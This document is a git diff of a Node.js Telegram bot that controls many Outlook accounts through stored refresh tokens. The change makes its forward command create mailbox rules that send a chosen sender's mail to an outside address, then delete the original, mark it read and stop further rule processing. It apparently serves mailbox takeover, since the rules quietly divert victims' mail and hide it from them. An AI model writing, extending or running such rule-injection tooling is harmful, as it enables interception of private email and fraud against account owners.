@@ -384,137 +384,201 @@ class SenderCommands {
     }
 
     // ============= ENABLE FORWARD METHOD =============
-    async enableForward(chatId, sender, targetEmail) {
-        const accounts = await Account.find({
-            telegramChatId: chatId.toString(),
-            status: 'active'
-        });
+async enableForward(chatId, sender, targetEmail) {
+    const accounts = await Account.find({
+        telegramChatId: chatId.toString(),
+        status: 'active'
+    });
 
-        if (accounts.length === 0) {
-            return this.bot.sendMessage(chatId, '❌ No active accounts found.');
-        }
-
-        await this.bot.sendMessage(chatId,
-            `📨 *Creating forward rule*\n` +
-            `└ Sender: \`${sender}\`\n` +
-            `└ Target: \`${targetEmail}\`\n` +
-            `└ Accounts: ${accounts.length}`,
-            { parse_mode: 'Markdown' }
-        );
-
-        let success = 0;
-        let failed = 0;
-
-        for (const account of accounts) {
-            try {
-                const refreshToken = decryptToken(account.refreshToken);
-                const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
-                
-                if (tokenResult.success) {
-                    const ruleName = `Forward_${sender}_to_${targetEmail.replace(/[@.]/g, '_')}`;
-                    
-                    const rule = {
-                        displayName: ruleName,
-                        sequence: 2,
-                        isEnabled: true,
-                        conditions: {
-                            or: [
-                                { senderContains: [sender] },
-                                { subjectContains: [sender] }
-                            ]
-                        },
-                        actions: {
-                            forwardTo: [{ emailAddress: { address: targetEmail } }],
-                            markAsRead: true
-                        }
-                    };
-
-                    await this.ruleManager.createCustomRule(
-                        tokenResult.accessToken,
-                        account._id,
-                        rule
-                    );
-
-                    account.forwardRules = account.forwardRules || [];
-                    account.forwardRules.push({
-                        sender,
-                        targetEmail,
-                        action: 'forward',
-                        createdAt: new Date(),
-                        isActive: true
-                    });
-                    await account.save();
-
-                    success++;
-                } else {
-                    failed++;
-                }
-            } catch (err) {
-                failed++;
-            }
-        }
-
-        await this.bot.sendMessage(chatId,
-            `✅ *Forward Rule Created*\n\n` +
-            `📧 From: \`${sender}\`\n` +
-            `📨 To: \`${targetEmail}\`\n` +
-            `✅ Success: ${success}/${accounts.length}\n` +
-            `❌ Failed: ${failed}`,
-            { parse_mode: 'Markdown' }
-        );
+    if (accounts.length === 0) {
+        return this.bot.sendMessage(chatId, '❌ No active accounts found.');
     }
 
-    // ============= DISABLE FORWARD METHOD =============
-    async disableForward(chatId, sender) {
-        const accounts = await Account.find({
-            telegramChatId: chatId.toString(),
-            status: 'active'
-        });
+    await this.bot.sendMessage(chatId,
+        `📨 *Creating forward rule*\n` +
+        `└ Sender: \`${sender}\`\n` +
+        `└ Target: \`${targetEmail}\`\n` +
+        `└ Accounts: ${accounts.length}`,
+        { parse_mode: 'Markdown' }
+    );
 
-        if (accounts.length === 0) {
-            return this.bot.sendMessage(chatId, '❌ No active accounts found.');
+    let success = 0;
+    let failed = 0;
+
+for (const account of accounts) {
+    try {
+        const refreshToken = decryptToken(account.refreshToken);
+        const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
+        
+        if (tokenResult.success) {
+            // ✅ CLEAN RULE NAME
+            const cleanSender = sender.replace(/[@.]/g, '_').replace(/[^a-zA-Z0-9_]/g, '');
+            const cleanTarget = targetEmail.replace(/[@.]/g, '_').replace(/[^a-zA-Z0-9_]/g, '');
+            const ruleName = `Forward_${cleanSender}_to_${cleanTarget}`;
+            
+// ✅ FIXED - Use 'from' condition for exact sender match!
+const rule = {
+    displayName: ruleName,
+    sequence: 999,
+    isEnabled: true,
+    conditions: {
+        from: {  // ✅ More reliable than subjectContains!
+            emailAddresses: [
+                {
+                    address: sender
+                }
+            ]
         }
+    },
+    actions: {
+        forwardTo: [
+            {
+                emailAddress: {
+                    address: targetEmail
+                }
+            }
+        ],
+        delete: true,
+        markAsRead: true,
+        stopProcessingRules: true
+    }
+};
 
-        let success = 0;
-        let failed = 0;
+            console.log('📤 Creating forward+delete rule:', JSON.stringify(rule, null, 2));
 
-        for (const account of accounts) {
-            try {
-                const refreshToken = decryptToken(account.refreshToken);
-                const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
+            // Check if rule exists
+            const existingRules = await this.ruleManager.getRules(tokenResult.accessToken);
+            const existingRule = existingRules.find(r => r.displayName === ruleName);
+            
+            if (existingRule) {
+                await this.ruleManager.updateRule(
+                    tokenResult.accessToken,
+                    existingRule.id,
+                    rule
+                );
+                console.log('✅ Forward+Delete rule updated');
+            } else {
+                await this.ruleManager.createCustomRule(
+                    tokenResult.accessToken,
+                    account._id,
+                    rule
+                );
+                console.log('✅ Forward+Delete rule created');
+            }
+
+            // Database update
+            account.forwardRules = account.forwardRules || [];
+            
+            const existingForwardRule = account.forwardRules.find(
+                r => r.sender === sender && r.targetEmail === targetEmail
+            );
+            
+            if (!existingForwardRule) {
+                account.forwardRules.push({
+                    sender,
+                    targetEmail,
+                    action: 'forward_delete',  // 🔥 Action update
+                    createdAt: new Date(),
+                    isActive: true
+                });
+            }
+            
+            await account.save();
+            success++;
+        } else {
+            failed++;
+        }
+    } catch (err) {
+        console.error(`❌ Forward rule error for ${account.email}:`, err.message);
+        failed++;
+    }
+}
+
+    await this.bot.sendMessage(chatId,
+        `✅ *Forward Rule Created*\n\n` +
+        `📧 From: \`${sender}\`\n` +
+        `📨 To: \`${targetEmail}\`\n` +
+        `✅ Success: ${success}/${accounts.length}\n` +
+        `❌ Failed: ${failed}`,
+        { parse_mode: 'Markdown' }
+    );
+}
+
+// ============= DISABLE FORWARD METHOD - FIXED =============
+async disableForward(chatId, sender, targetEmail = null) {
+    const accounts = await Account.find({
+        telegramChatId: chatId.toString(),
+        status: 'active'
+    });
+
+    if (accounts.length === 0) {
+        return this.bot.sendMessage(chatId, '❌ No active accounts found.');
+    }
+
+    let success = 0;
+    let failed = 0;
+    let removedRules = [];
+
+    for (const account of accounts) {
+        try {
+            const refreshToken = decryptToken(account.refreshToken);
+            const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
+            
+            if (tokenResult.success) {
+                let rulesToRemove = [];
                 
-                if (tokenResult.success) {
-                    const forwardRules = account.forwardRules?.filter(r => r.sender === sender) || [];
-                    
-                    for (const rule of forwardRules) {
-                        const ruleName = `Forward_${sender}_to_${rule.targetEmail.replace(/[@.]/g, '_')}`;
-                        try {
-                            await this.ruleManager.removeRule(tokenResult.accessToken, ruleName);
-                        } catch (err) {
-                            // Rule might not exist
-                        }
+                if (targetEmail) {
+                    // ✅ SPECIFIC TARGET WALA FORWARD HATAO
+                    rulesToRemove = account.forwardRules?.filter(r => 
+                        r.sender === sender && r.targetEmail === targetEmail
+                    ) || [];
+                } else {
+                    // ✅ SENDER KI SARI FORWARD RULES HATAO
+                    rulesToRemove = account.forwardRules?.filter(r => r.sender === sender) || [];
+                }
+
+                for (const rule of rulesToRemove) {
+                    const ruleName = `Forward_${sender.replace(/[@.]/g, '_')}_to_${rule.targetEmail.replace(/[@.]/g, '_')}`;
+                    try {
+                        await this.ruleManager.removeRule(tokenResult.accessToken, ruleName);
+                        removedRules.push(`${sender} → ${rule.targetEmail}`);
+                    } catch (err) {
+                        // Rule might not exist
                     }
-
-                    account.forwardRules = account.forwardRules?.filter(r => r.sender !== sender);
-                    await account.save();
-
-                    success++;
-                } else {
-                    failed++;
                 }
-            } catch (err) {
+
+                // Database update - SPECIFIC RULE HATAO
+                if (targetEmail) {
+                    account.forwardRules = account.forwardRules?.filter(r => 
+                        !(r.sender === sender && r.targetEmail === targetEmail)
+                    ) || [];
+                } else {
+                    account.forwardRules = account.forwardRules?.filter(r => r.sender !== sender) || [];
+                }
+                
+                await account.save();
+                success++;
+            } else {
                 failed++;
             }
+        } catch (err) {
+            console.error(`❌ Disable forward error for ${account.email}:`, err);
+            failed++;
         }
-
-        await this.bot.sendMessage(chatId,
-            `✅ *Forward Rules Disabled*\n\n` +
-            `📧 Sender: \`${sender}\`\n` +
-            `✅ Success: ${success}/${accounts.length}\n` +
-            `❌ Failed: ${failed}`,
-            { parse_mode: 'Markdown' }
-        );
     }
+
+    let message = `✅ *Forward Rules Disabled*\n\n`;
+    if (targetEmail) {
+        message += `📧 Removed: \`${sender} → ${targetEmail}\`\n`;
+    } else {
+        message += `📧 Sender: \`${sender}\`\n`;
+        message += `📋 Removed: ${removedRules.length} rule(s)\n`;
+    }
+    message += `✅ Success: ${success}/${accounts.length}\n`;
+    message += `❌ Failed: ${failed}`;
+
+    await this.bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+}
 }
 
 module.exports = SenderCommands;
